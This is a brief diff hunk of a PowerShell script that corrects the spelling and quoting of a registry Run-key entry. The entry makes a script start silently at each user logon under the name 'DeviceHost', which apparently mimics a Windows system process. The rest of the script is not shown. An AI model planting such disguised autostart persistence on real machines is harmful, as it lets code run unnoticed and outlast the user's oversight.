@@ -69,8 +69,9 @@ catch {
 }
 
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-                 -Name "DevidceHost" `
-                 -Value "powershell.exe -NoProfile -File $ScriptPath
+                 -Name "DeviceHost" `
+                 -Value "powershell.exe -NoProfile -File `"$ScriptPath`""
+
 
 
 
